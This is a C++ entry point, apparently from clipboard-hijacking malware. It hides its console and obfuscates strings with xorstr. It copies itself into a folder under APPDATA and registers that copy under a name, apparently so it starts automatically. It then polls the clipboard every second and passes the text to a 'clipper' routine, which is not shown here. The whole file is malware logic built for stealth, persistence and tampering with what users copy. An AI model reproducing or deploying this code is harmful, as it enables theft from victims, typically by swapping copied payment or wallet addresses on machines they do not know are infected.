#include "config.h"
#include "other.h"
#include "clipboard.h"
#include "clipper.h"
#include "registry.h"
#include "console.h"

int main() {
    try {
#ifdef DEBUGGING
            show_console();
#else
            hide_console();
#endif

#ifndef DEBUGGING
        std::string appdata = getenv(xorstr("APPDATA"));
        appdata += xorstr("\\") + path;

        if (!std::filesystem::exists(appdata))
            std::filesystem::create_directories(appdata);

        if (std::filesystem::exists(appdata)) {
            appdata += xorstr("\\") + exe;
            dupe(appdata);
        }

        if (std::filesystem::exists(appdata)) {
            std::wstring register_name = s2ws(name).c_str();

            if (!Check(register_name.c_str())) {
                Register(register_name.c_str(), s2ws(appdata).c_str(), L"");
            }

        }
#endif

        while (true) {
            std::string clipboard = get_clipboard_text();
            clipper(clipboard);
            sleep(1000);
        }
    }
    catch (...) {
#ifdef DEBUGGING
        log("Error caught.");
#endif
    }
}